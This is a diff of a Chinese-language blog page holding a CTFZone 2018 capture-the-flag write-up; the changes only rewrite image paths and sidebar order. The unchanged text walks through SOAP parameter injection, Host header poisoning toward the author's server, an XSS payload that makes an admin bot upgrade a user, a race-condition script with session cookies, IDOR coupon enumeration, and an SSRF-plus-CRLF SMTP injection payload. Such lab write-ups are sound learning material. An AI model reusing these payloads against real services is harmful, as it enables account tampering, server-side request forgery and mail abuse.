@@ -416,12 +416,12 @@
 <p>结果:</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span> (Our ID) <span class="tag">&lt;/<span class="name">receiver_wallet_num</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sender_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>(Any ID)<span class="tag">&lt;/<span class="name">sender_wallet_num</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;/receiver_wallet_num&gt;</span></span><br><span class="line"><span class="comment">&lt;sender_wallet_num xsi:type="xsd:decimal"&gt; [LOGGED IN USER ID] &lt;/sender_wallet_num&gt;</span></span><br><span class="line"><span class="comment">&lt;amount xsi:type="xsd:float"&gt; </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">amount</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:float"</span>&gt;</span> (Amount) <span class="tag">&lt;/<span class="name">amount</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">token</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:string"</span>&gt;</span> [SECRET SERVER TOKEN] <span class="tag">&lt;/<span class="name">token</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>然后开burp跑就行。</p>
-<p><img src="/assets/ctfzone/TIM截图20180803174532.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803174532.png" alt=""></p>
 </li>
 <li><p>解法2：Host header poisoning</p>
 <p>从上图，我们可以看到当前Host是<code>web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one</code></p>
 <p>修改该Host为我们的vps_ip,并在我们的vps上创建<code>/api/bankservice.wsdl.php</code>文件，然后发包，监听80端口。</p>
-<p><img src="/assets/ctfzone/TIM截图20180803181237.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803181237.png" alt=""></p>
 <p>监听端口:</p>
 <blockquote>
 <p>ngrep -q -d eth0 -W byline port 80</p>
@@ -435,16 +435,16 @@
 </ol>
 <h2 id="Magician"><a href="#Magician" class="headerlink" title="Magician"></a>Magician</h2><ol>
 <li><p>从support.php可知该题应该是XSS。修改<em>Link to Profile</em>可以判断后台bot使用<em>Firefox 61.0</em></p>
-<p><img src="/assets/ctfzone/TIM截图20180803210045.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803210045.png" alt=""></p>
 <p>vps日志显示如下:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] &quot;GET / HTTP/1.1&quot; 200 65 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&quot;</span><br><span class="line">35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&quot;</span><br><span class="line">35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&quot;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>xss漏洞</p>
 <p>uuid存在反射型xss,限制长度36个字符</p>
-<p><img src="/assets/ctfzone/TIM截图20180803211936.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803211936.png" alt=""></p>
 </li>
 <li><p>how to get flag</p>
-<p><img src="/assets/ctfzone/TIM截图20180803212218.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803212218.png" alt=""></p>
 <p>这里需要管理员将<code>Status</code>修改为<code>Premium</code></p>
 </li>
 <li><p>思路：</p>
@@ -460,9 +460,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open(&apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=&quot;&gt;&lt;svg/onload=$.globalEval(name)&apos;, &lt;long payload&gt;)</span><br></pre></td></tr></table></figure>
 <p>将 window.name 设置为<code>&lt;long payload&gt;</code>。</p>
 <p>将该html放在vps上，然后提交即可。</p>
-<p><img src="/assets/ctfzone/TIM截图20180803213031.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803213031.png" alt=""></p>
 <p>getflag</p>
-<p><img src="/assets/ctfzone/TIM截图20180803212919.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803212919.png" alt=""></p>
 </li>
 <li><p>解法2:</p>
 <p>payload:</p>
@@ -474,11 +474,11 @@
 <p>接下来一次在控制台中输入:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location = &apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=srcdoc=window.name%3E&apos;;</span><br></pre></td></tr></table></figure>
 <p>发现成功弹窗户。</p>
-<p><img src="/assets/ctfzone/TIM截图20180803214831.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803214831.png" alt=""></p>
 <p>在次输入:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location = &apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=window.name%3E&apos;;</span><br></pre></td></tr></table></figure>
 <p>我们会发现，再不添加<code>srcdoc</code>参数的情况下，不在弹窗。</p>
-<p><img src="/assets/ctfzone/TIM截图20180803214950.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803214950.png" alt=""></p>
 <p>getflag:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.name = `</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.frameElement.onload=null;</span><br><span class="line">console.log(window.parent.document.body.innerHTML);</span><br><span class="line">function elo()</span><br><span class="line">&#123;</span><br><span class="line">document.getElementById(&apos;cudo&apos;).onload=null;</span><br><span class="line">r = document.getElementById(&apos;cudo&apos;).contentWindow.document;</span><br><span class="line">r.getElementsByName(&apos;user_uuid&apos;)[0].value = &apos;dbb306dd-28c1-4333-88ba-9588842f08e0&apos;;</span><br><span class="line">r.getElementsByName(&apos;status&apos;)[0].value = &apos;premium&apos;;</span><br><span class="line">r.getElementById(&apos;user_manage&apos;).submit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">`</span><br><span class="line">window.name += &apos;&lt;/scrip&apos;+&apos;t&gt;&lt;iframe src=&quot;/manage.php&quot; onload=&quot;elo()&quot; id=&quot;cudo&quot;&gt;&apos;;</span><br><span class="line">window.location = &apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=srcdoc=window.name%3E&apos;</span><br></pre></td></tr></table></figure>
 </li>
@@ -487,35 +487,35 @@
 <li><p>注册登录</p>
 </li>
 <li><p>在<code>Donate</code>页面获取免费武器。</p>
-<p><img src="/assets/ctfzone/TIM截图20180803220511.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803220511.png" alt=""></p>
 <p>图片url:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_96c5c28becf18e71190460a9955aa4d8.png</span><br></pre></td></tr></table></figure>
 <p>其中：</p>
-<p><img src="/assets/ctfzone/TIM截图20180803220606.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803220606.png" alt=""></p>
 <p>此时，userid为860。</p>
 </li>
 <li><p>获取更多<code>coupon</code></p>
 <p>根据上边得到结果，我们可以测试一下 <code>859</code></p>
-<p><img src="/assets/ctfzone/TIM截图20180803221240.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803221240.png" alt=""></p>
 <p>得到url:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_537de305e941fccdbba5627e3eefbb24.png</span><br></pre></td></tr></table></figure>
 <p>访问该url:</p>
-<p><img src="/assets/ctfzone/TIM截图20180803221334.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803221334.png" alt=""></p>
 <p>得到新的<code>Coupon</code></p>
 <blockquote>
 <p>f598109a-942c</p>
 </blockquote>
-<p><img src="/assets/ctfzone/TIM截图20180803221422.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803221422.png" alt=""></p>
 <p>成功长了1分。</p>
 <p>这时候，测试<code>1</code>.</p>
-<p><img src="/assets/ctfzone/TIM截图20180803221713.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803221713.png" alt=""></p>
 <p>得到url:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_6512bd43d9caa6e02c990b0a82652dca.png</span><br></pre></td></tr></table></figure>
-<p><img src="/assets/ctfzone/TIM截图20180803221807.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803221807.png" alt=""></p>
 <p>然后就可以再次得到1337分，并升级。</p>
 </li>
 <li><p>到达30级，新的问题。</p>
-<p><img src="/assets/ctfzone/TIM截图20180803221945.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803221945.png" alt=""></p>
 <p>无法继续升级。</p>
 </li>
 <li><p>条件竞争。</p>
@@ -529,21 +529,21 @@
 <p>race_condition.py</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">import requests</span><br><span class="line">from Queue import Queue</span><br><span class="line"></span><br><span class="line">max = 100</span><br><span class="line">threads = Queue()</span><br><span class="line"></span><br><span class="line">def lvlup(cookie):</span><br><span class="line">    threads.get()</span><br><span class="line">    url = &quot;http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/donate/lvlup&quot;</span><br><span class="line">    r = requests.get(url, cookies=&#123;&quot;session&quot;: cookie&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def worker2(index):</span><br><span class="line">    lvlup(&quot;eyJ1aWQiOjg2MX0.DkX_wQ.Mvm0XsHQF4JnYmca6pt8z-vUkaE&quot;)       # chrome</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def worker(index):</span><br><span class="line">    lvlup(&quot;eyJ1aWQiOjg2Mn0.DkX_zA.egXto8_Qdii7FNhj43zKekmtYP0&quot;)         # firefox</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def race():</span><br><span class="line">    for i in range(max):</span><br><span class="line">        thread = threading.Thread(target=worker, args=[i])</span><br><span class="line">        thread.start()</span><br><span class="line">    for i in range(max):</span><br><span class="line">        thread = threading.Thread(target=worker2, args=[i])</span><br><span class="line">        thread.start()</span><br><span class="line">    for i in range(max * 2):</span><br><span class="line">        threads.put(i)</span><br><span class="line">    threads.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">race()</span><br></pre></td></tr></table></figure>
 <p>结果：</p>
-<p><img src="/assets/ctfzone/TIM截图20180803232555.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803232555.png" alt=""></p>
 </li>
 <li><p>SSRF</p>
 <p>通过条件竞争，到达31级别，出现了新的页面。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar</span><br></pre></td></tr></table></figure>
 <p>这里存在ssrf漏洞。</p>
-<p><img src="/assets/ctfzone/TIM截图20180803234111.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803234111.png" alt=""></p>
 <p>通过测试，可以发现过滤了<code>127.0.0.1</code>, <code>localhost</code>,可以通过<code>0.0.0.0</code>或者<code>127.0.0.2</code> bypass。</p>
 <p>端口扫描:</p>
 <p>示意图如下：</p>
-<p><img src="/assets/ctfzone/TIM截图20180803234335.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803234335.png" alt=""></p>
 </li>
 </ol>
 <p>   经过测试，发现25端口开放。</p>
-<p>   <img src="/assets/ctfzone/port_scan.png" alt=""></p>
+<p>   <img src="/posts/39475/assets/ctfzone/port_scan.png" alt=""></p>
 <p>   这里存在http header注入(CRLF注入)</p>
 <p>   构造paylaod:</p>
    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Host: [0.0.0.0</span><br><span class="line">helo 1v3m</span><br><span class="line">mail from:&lt;qaewjlfnwej@o3enzyme.com&gt;</span><br><span class="line">rcpt to:&lt;root&gt;</span><br><span class="line">data</span><br><span class="line">subject: give me flag</span><br><span class="line"></span><br><span class="line">1v3m</span><br><span class="line">.</span><br><span class="line">]:25</span><br></pre></td></tr></table></figure>
@@ -564,7 +564,7 @@
 <p>原因:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Our mistake was missing the special case implemented in postfix:</span><br><span class="line">There is a hardening which targets exactly what we wanted to do - using HTTP request with injected headers to smuggle SMTP commands. The way to bypass this was to use https instead of http, because in such case the initial part of the request will actually be encrypted, and SMTP will ignore it, and the Host will be in plaintext so the server will receive nice set of SMTP commands. </span><br><span class="line">简单来说，就是当我们使用http请求，并使用 http header注入 来注入SMTP命令的时候，会被拦截。可以使用 https， 因为 https 流量是加密过的，这样，SMTP会忽略该流量，当流量到达主机，会被解密，这时候SMTP就会收到一组漂亮的 SMTP 命令。</span><br></pre></td></tr></table></figure>
 <p>结果:</p>
-<p><img src="/assets/ctfzone/TIM截图20180803235132.png" alt=""></p>
+<p><img src="/posts/39475/assets/ctfzone/TIM截图20180803235132.png" alt=""></p>
 </li>
 </ol>
 <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="easypwn-strings"><a href="#easypwn-strings" class="headerlink" title="easypwn_strings"></a>easypwn_strings</h2><p>dump.py:</p>
@@ -722,24 +722,6 @@
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1826,12 +1808,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
         </li>
     
     
@@ -1899,19 +1881,19 @@
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
-    
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
-        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
-    
         <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
     
-        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
+        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
@@ -1919,9 +1901,9 @@
     
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
-        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
-    
         <span class="sidebar-tag-name" data-tags="python安全"><span class="iconfont-archer">&#xe606;</span>python安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
     
         <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
     
